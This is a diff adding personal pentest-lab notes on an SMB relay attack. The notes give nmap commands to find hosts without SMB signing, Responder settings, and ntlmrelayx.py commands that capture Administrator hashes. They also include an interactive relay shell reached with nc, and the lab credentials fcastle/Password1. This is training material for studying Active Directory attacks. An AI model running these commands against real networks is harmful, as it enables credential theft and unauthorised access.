@@ -460,3 +460,59 @@ we can -->      - relay those hashes with SMB
 <span style="background:#fff88f">requirements for this attack:</span>
 - SMB signing -->  must be disabled 
 - relayed user credentials -->  must be admin on machine (for any real value)
+
+attack steps:
+1) Identify hosts without SMB Signing
+2) use Responder (but with modification to Responder.conf => SMB and HTTP OFF)
+3) use ntlmrelayx.py
+4) from the victim side we need an event that occurs
+
+##### Identify host without SMB Signing (nmap)
+`nmap --script=smb2-security-mode.nse -p445 <DomainControllerIP> -Pn`
+`-Pn` -->  treat all hosts as online
+=>
+`nmap --script=smb2-security-mode.nse -p445 127.16.214.128 -Pn`
+This is the message that we are looking for:
+![[Pasted image 20240226103728.png]]
+
+=>
+create a .txt file and insert the Domain Controller IP -->  called targets.txt
+
+##### Modify and use Responder
+We need to disable -->  SMB and HTTP
+`sudo vi ~/Desktop/TCM/tools/Responder`
+change to Off -->  SMB and HTTP
+
+now we can use it:
+`sudo python3 Responder.py -I vmnet8 -dwv`
+
+##### Set up NTLM relay (ntlmrelayx.py)
+`ntlmrelayx.py -tf targets.txt -sm2support` 
+`-tf` -->  target file
+
+##### Victim Event Occurs
+from THEPUNISHER:
+- login as fcastle with Password1
+- open file explorer
+- type in the bar -->  `\\ip attacker`
+=>
+if we look at our terminal with `ntlmrelayx.py':
+<font color="#2DC26B">we have found Aministrator and Peter Parker hashes</font>
+![[Pasted image 20240226104434.png]]
+
+##### Another possible Attack
+`ntlmrelayx.py -tf targets.txt -sm2support -i`
+`-i` -->  interactive mode
+=>
+if we create again another event inside the victim:
+<span style="color:#00b050">we obtain a shell via TCP</span>
+![[Pasted image 20240226105252.png]]
+=>
+we need to bind to that shell:
+`nc 127.0.0.1 11000`
+![[Pasted image 20240226105537.png]]
+if we type `help` -->  we can see all the commands that we can use
+
+##### SMB Relay Mitigation
+<span style="background:#fff88f">Possibile mitigation:</span>
+![[Pasted image 20240226110048.png]]
